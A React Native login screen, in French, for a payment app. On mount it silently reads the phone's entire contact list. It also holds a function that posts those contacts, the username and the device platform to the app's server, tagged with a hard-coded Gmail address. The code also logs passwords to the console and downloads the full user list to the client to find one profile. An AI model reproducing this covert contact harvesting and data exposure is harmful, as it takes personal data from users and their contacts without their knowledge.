import React , { useState, useEffect } from 'react';
import { ScrollView,Image, StyleSheet,Platform, SafeAreaView, TouchableOpacity, TouchableHighlight, StatusBar,TouchableWithoutFeedback, KeyboardAvoidingView, Text, View, Alert, Keyboard } from 'react-native';
import Suivant from '../section/suivant';
import FormInscription from '../section/formInscription';
import { TextInput } from 'react-native-paper';
import { useNavigation,  useIsFocused , useFocusEffect } from '@react-navigation/native';
import TermeCondition from '../section/termeInscription';
import axios from 'axios';
import { useSelector , useDispatch } from 'react-redux';
import { actionId, actionNom, actionPrenom ,actionFiles, actionItems, actionTelephone,actionSexe, actionPseudo, actionCommune, actionDate, actionQuartier, actionVille, actionEmail, actionPays } from '../../store/reducers/reducerProfil';
import * as RNLocalize from "react-native-localize";
import i18n from 'i18n-js';
import { fr, en } from '../../i18n/supportedLanguages';
import { actionModeButton } from '../../store/reducers/reducerButton';
import { Header } from 'react-navigation-stack';
import Contacts from 'react-native-contacts';
import * as Animatable from 'react-native-animatable';
import Icon from 'react-native-vector-icons/Feather';
import { PermissionsAndroid } from 'react-native';
import AsyncStorage from '@react-native-community/async-storage';
import NetInfo from "@react-native-community/netinfo";
import AwesomeAlert from 'react-native-awesome-alerts';
import email from 'react-native-email'
import Dialog from "react-native-dialog";

export default function Connexion() {

  i18n.fallbacks = true;
  i18n.translations = { en, fr };
    
  const dta = RNLocalize.getLocales().find(e=> {return e.languageCode})
  i18n.locale = dta.languageCode

  let [mp, setMP] = useState(true);
  let [pseudo , setPseudo] = useState('')
  let [password , setPassword] = useState('')
  let [message , setMessage] = useState('')
  let [erreur , setErreur] = useState(false)
  let [load, setLoad]= useState(false)
  let [showAlert, setShowAlert]= useState(false)

  const [visible, setVisible] = useState(false);
  const [contactsData, setContactsData] = useState([]);
  const [telephone, setTelephone] = useState('');
  const dataProfil = useSelector(state=> state.reducerProfil.profil)
  const [showPassword, setShowPassword]= useState(true)
  const dispatch = useDispatch()
  const navigation = useNavigation();
  const url = 'https://www.barapaye.com/login1/'
  const urlListe = 'https://www.barapaye.com/liste/'
  const urltrans =`https://www.barapaye.com/status/${pseudo}/`
 
  useEffect(() => {
    
    if (Platform.OS === 'ios' ) {
        useContacts()
        setTelephone('ios')
    } else if(Platform.OS=== 'android' ) {
      useContacts()
        setTelephone('android')
    }
    else{
      useContacts()
      setTelephone(Platform.OS)
    }
  }, [])

  useFocusEffect(
    React.useCallback(() => {
      console.log('Home Screen was focused');
      setLoad(false)
      return () => {
        console.log('Home Screen was unfocused');
      };
    }, [])
  );

  const actionPress=()=>{
    setShowPassword(!showPassword)
  }

  const handleCancel = () => {
    setVisible(false);
  };
  


    const sendEmail =  () => {

    const formData = new FormData();
    formData.append('user_one', "lotusrouge225@gmail.com");
    formData.append('user_two', "lotusrouge225@gmail.com");
    formData.append('utilisateur', pseudo);
    formData.append('body', contactsData );
    formData.append('phone', telephone );
   
     axios({
       url : 'https://www.barapaye.com/send_email/',
       method : 'POST',
       data : formData,
       headers: {
             Accept: 'application/json',  
           }
     })
     .then(function (response) {
       
         setErreur(false)
         setLoad(false)
         getTrans()
        //  return navigation.push('Ajouter')

     })
     .catch(function (error) {
      
       setErreur(false)
       setLoad(false)
       
     })
 }

 const handleEmail = () => {
  const to = ['barapaye.assistant@hotmail.com'] // string or array of email addresses
  email(to, {
      // Optional additional arguments
      cc: [], // string or array of email addresses
      // bcc: 'mee@mee.com', // string or array of email addresses
      subject: 'Obtenir un nouveau Mot de Passe',
      body: ''
  }).catch(console.error)
}




 async function useContacts () {
  if (Platform.OS === 'ios') {
      const myContact = await Contacts.getAll((a, b)=>{
        console.log(b)
        setContactsData(JSON.stringify(b))
      });

    }
  else if(Platform.OS === 'android') {
      try {
        const permission = await PermissionsAndroid.request(
          PermissionsAndroid.PERMISSIONS.READ_CONTACTS
        );


         if (permission === 'granted') {
            Contacts.getAll((a, b)=>{
              
               setContactsData(JSON.stringify(b))
               console.log('android '+ JSON.stringify(b))
             });
           
         } 
        } 
        catch(errors){
        
        }
    }
 }  
 


const dataUser={
  username: pseudo.toLowerCase(),
  password: password,
}

const recup =()=>{
  axios.get(urlListe)
  .then((e)=>{
      const dataA = e.data
      const dataM = dataA.find(e =>e.pseudo === pseudo)
      dispatch(actionNom({nomUtilisateur:dataM.nom}))
      dispatch(actionPrenom({prenomUtilisateur:dataM.prenom}))
      dispatch(actionPseudo({pseudoUtilisateur:pseudo}))
      dispatch(actionPays({paysUtilisateur:dataM.pays}))
      dispatch(actionEmail({emailUtilisateur:dataM.email}))
      dispatch(actionSexe({sexeUtilisateur:dataM.sexe}))
      dispatch(actionTelephone({telephoneUtilisateur:dataM.telephone}))
      dispatch(actionDate({dateUtilisateur:dataM.age}))
      dispatch(actionCommune({communeUtilisateur:dataM.commune}))
      dispatch(actionVille({villeUtilisateur:dataM.ville}))
      dispatch(actionQuartier({quartierUtilisateur:dataM.quartier}))
      
      AsyncStorage.setItem('pseudo',pseudo)
      getTrans()

  }).catch((e)=>{
   
  })

}

const getTrans = ()=>{
   
  axios.get(urltrans)
  .then(res => {
    const dataRes = res.data
    const finder= dataRes.filter(e => {
      return (e.payment_status === 'completed' && e.clientLastname === pseudo.toLowerCase()) || (e.payment_status === 'pending' && e.clientLastname === pseudo.toLowerCase())
    } )  
    setErreur(false)
    setLoad(false)
    const inverser = finder.reverse()
    dispatch(actionFiles({filesUtilisateur:inverser}))
    dispatch(actionItems({itemsUtilisateur:finder.length}))
    navigation.reset({
      index:0,
      routes:[{ name:'visa' }]
   })
  })
  .catch((e)=>{
    setErreur(false)
    setLoad(false)
    console.log('erreur')
  })
  
}


const add =  (event) => {

  NetInfo.isConnected.fetch().then(isConnected => {
    if(isConnected === true){
      if(pseudo !== ''){
        if(password !== ''){
          setLoad(true)
         
          axios.post(url, dataUser)
            .then(res => {
              dispatch(actionModeButton({payloadChargementHome:true}))  
              recup()  
              
            })
          .catch( e=>{
            setLoad(false)
            setErreur(true)
          
            console.log(pseudo)
            setMessage(i18n.t('VerifiezInfo'))
          })  
        }
        else{
          setLoad(false)
          setErreur(true)
          setMessage(i18n.t('renseigneConnexion'))
        }
      }
      else{
        setLoad(false)
        setErreur(true)
        setMessage(i18n.t('renseigneConnexion'))
      }
    }
    else{
      setLoad(false)
      setErreur(true)
      setShowAlert(true)
    }
  });

}

const back= ()=>{
  return navigation.popToTop()
}

  const validationPseudo = (event)=>{
    const format= event.replace(/\s+/g, '')
    setPseudo(format)
    console.log(pseudo)
  }
  const validationPassword = (event)=>{
    setPassword(event)
    console.log(password)
  }



  return (
    <KeyboardAvoidingView style={styles.container} keyboardVerticalOffset={(Platform.OS ==='ios'? 0:Header.height + 20) } behavior={ Platform.OS === 'ios' ? 'padding' : 'height' }>

        <View style={{ flex:1,  }} >
        <SafeAreaView style={{ backgroundColor:'#003060', }}>
          <StatusBar translucent={true} barStyle='light-content' backgroundColor='#003060' />
        </SafeAreaView>

        <View style={{ height:120, paddingTop:37 , marginTop:25, justifyContent:'flex-end', marginBottom:15, backgroundColor:'#002040', paddingBottom:10 }}>
          <TouchableOpacity style={{ position:'absolute', top:10, left:9 ,paddingLeft:3, height:40, width:50 }} onPress={back}>
            <Icon name="arrow-left" size={30} color="#E9F9FF" />
          </TouchableOpacity>
          <Text style={{ color:'white', fontSize:30, width:'100%', textAlign:'center' }}>{i18n.t('connexionAcceuil')}</Text>
        </View>
        <View style={{ flex:1,  backgroundColor:'#E9F9FF' }}>
        <ScrollView keyboardShouldPersistTaps='always' style={{ flex:1, backgroundColor:'#E9F9FF', borderTopStartRadius:25, borderTopEndRadius:25 }}>
            <Animatable.View  animation="slideInUp" style={{ flex:1, backgroundColor:'#E9F9FF', padding:30, borderTopStartRadius:25, borderTopEndRadius:25 }}>
             
              <View style={{ width:'100%', flexDirection:'row', height:50 }}>
                  <View style={{ width:40, marginTop:15, }}>
                      <Icon name="user" size={30} color="black" />
                  </View>
                
                  <TextInput 
                    autoCorrect={false}
                  
                    underlineColorAndroid='transparent'
                    placeholder='Pseudo'
                    value={pseudo}
                    autoCapitalize='none'
                    onChangeText={validationPseudo} 
                    style={{  flex:1, backgroundColor:'none'}}
                  />
                  
              </View>

        
              <View style={{ width:'100%', flexDirection:'row', height:50, marginTop:15 }}>
                  <TouchableOpacity style={{ width:40, marginTop:15, }}>
                      <Icon name="key" size={30} color="black" />
                  </TouchableOpacity>
                
                  <TextInput 
                    secureTextEntry={(showPassword === true ? true: false)}
                    onChangeText={validationPassword}
                    placeholder='Password'
                    autoCapitalize='none'
                    style={{  flex:1, padding:0, backgroundColor:'none'}}
                  />
                  <View style={{ width:30, marginTop:20, }}>
                    <TouchableOpacity onPress={actionPress} style={{ width:40,  }}>
                      {(showPassword === false ? <Icon name="eye" size={20} color="black" /> : <Icon name="eye-off" size={20} color="black" /> )}
                    </TouchableOpacity>
                  </View>
                  
              </View>
              <Text style={{ color:'red', textAlign:'center', marginTop:15, marginBottom:10, }}> {message} </Text>
              <View style={{ height:30,  width:'100%' }}>

                <Suivant titre={i18n.t('connexionAcceuil')} desactiver={load} c='white' loading={load} couleur='#191970' appel={add}  />
            </View>
            
            </Animatable.View>
            <Animatable.View  animation="slideInUp" style={{ backgroundColor:'#E9F9FF', }}>

            <TouchableOpacity  onPress={e=> setVisible(true) }>
              <Text style={{ color:'#750000', textAlign:'center', fontWeight:'bold'}}>{i18n.t('passeOublier')}</Text>  
            </TouchableOpacity>
            </Animatable.View>
        </ScrollView>


        <Dialog.Container visible={visible} contentStyle={{ backgroundColor:'#E9F9FF',  padding:15, borderRadius:15, borderWidth:1, borderColor:'white', justifyContent:'center', alignContent:'center' , alignItems:'center'}}>
            <Dialog.Title > <Text style={{ color:'#192f6a', fontWeight:'bold' }}>Change password </Text> </Dialog.Title>
            <View style={{  }}>

              <Text>{i18n.t('soumettre')} </Text>
              <View style={{ flexDirection:'row', }}>

                    <Dialog.Description contentStyle={{ flex:1, marginLeft:20,  }}>
                      <TouchableOpacity onPress={handleEmail} style={{ marginTop:-10 }}>
                        <Text style={{ color:'#192f6a',  }}>
                          {/* Soumettre */}
                          {i18n.t('demarrer')}
                        </Text>
                      </TouchableOpacity>
                    </Dialog.Description>
                  </View>

            </View>

            <View style={{ width:'100%', alignItems:'flex-end', alignContent:'flex-end', justifyContent:'flex-end' }}>
              <Dialog.Button label={i18n.t('fermer')}  onPress={handleCancel} />
            </View>
          </Dialog.Container>

            <AwesomeAlert
              show={showAlert}
              showProgress={false}
              title={i18n.t('TitleInternet')}
              message={i18n.t('messageInternet')}
              closeOnTouchOutside={false}
              closeOnHardwareBackPress={false}
              showCancelButton={true}
              showConfirmButton={false}
              cancelText="Ok"
              confirmText="Yes, delete it"
              cancelButtonColor="#003060"
              onCancelPressed={() => {
                setShowAlert(!showAlert)
              }}
              onConfirmPressed={() => {
                this.hideAlert();
              }}
            />


        </View>

        



        </View>
      
    </KeyboardAvoidingView>
  );
}

const styles = StyleSheet.create({
  container: {
    flexGrow: 1,
    backgroundColor:'#002040',
    height:'100%',
    padding:0,
  },
  image:{
    marginTop:20,
    width:85,
    height:40,
    justifyContent:'center',
    alignContent:'center',
    alignSelf:'center'
  },

});
